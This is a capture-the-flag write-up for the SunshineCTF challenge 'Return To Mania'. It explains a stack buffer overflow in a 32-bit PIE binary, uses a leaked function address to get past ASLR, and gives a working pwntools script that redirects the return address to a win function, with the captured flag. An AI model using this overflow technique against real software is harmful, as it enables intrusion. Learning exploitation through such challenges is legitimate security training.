## Return To Mania (Pwn, 50 pts)

#### Challenge Description

To celebrate her new return to wrestling, Captn Overflow authored this challenge to enter the ring

```
nc ret.sunshinectf.org 4301
```

Author: bambu

#### Overview

The challenge provides a download to a binary. The binary is an x86 (ELF32), and symbols haven't been stripped. The main function calls another function called `welcome()`, which essentially does the following:

```c
// pseudocode
void welcome()
{
    char key[18];
    
    printf("Welcome to WrestleMania! Type in key to get access.\n");
    printf("addr of welcome(): %p\n", (void *)welcome);
    
    scanf("%s", &key);
}
```

The issue here is fairly obvious in that there's no bounds checking on the input string, so a stack overflow is possible if you provide more than 18 characters. Running `checksec` on the binary reveals that the binary has NX and PIE enabled, therefore the addresses will be randomized. This can also be seen if you connect to the hostname and port above, you'll notice the address of `welcome()` is different every run.

Looking around the binary a bit more will reveal there's a win function called `mania()` that'll open a flag file to give us the flag.

#### Calculating the Win Function Address

Since ASLR is enabled and the binary is position independent (PIE), we'll need to calculate the address of the win function. We can do this using the pointer to `welcome()` that is provided to us. In the binary, the following functions have the following offsets:

```
welcome(): 0x6ED
mania(): 0x65D
```

This means that we can calculate the virtual address of `mania()` by taking the pointer provided for `welcome()` and subtracting 0x90.

#### Stack Smashing

Using the stack overflow we can overwrite the return address of `welcome()`. Since the buffer for the key is 18 bytes, and 4 bytes are needed for saving the base pointer, the address overwrite will happen after 22 bytes of input.

```
AAAAAAAAAAAAAAAAAAAAAA + [address of mania()]
```

#### Flag Script

I used pwntools to handle the remote connection stuff and to also get some helper functions such as `p32()` to write a 32-bit pointer to the payload.

```python
from pwn import *
context(arch='i386', os='linux')

r = remote('ret.sunshinectf.org', 4301)

# Receive trash
r.recvuntil(': ')

# Receive the line containing the address for ASLR defeat
addressLine  = r.recvline()
addressOfWin = int(addressLine, 16) - 0x90

print("[+] Win function: 0x" + format(addressOfWin, '02x'))

# Construct payload
payload = "A"*22
payload += p32(addressOfWin)

# Bombs away!
r.send(payload)
r.send("\x0A")

r.recvline()

print("[+] Found flag: " + r.recvline())
```

After running this script, we'll get the flag.

```
[+] Opening connection to ret.sunshinectf.org on port 4301: Done
[+] Win function: 0x565bd65d
[+] Found flag: sun{0V3rfl0w_rUn_w!Ld_br0th3r}

[*] Closed connection to ret.sunshinectf.org port 4301 
```

Flag:

```
sun{0V3rfl0w_rUn_w!Ld_br0th3r}
```

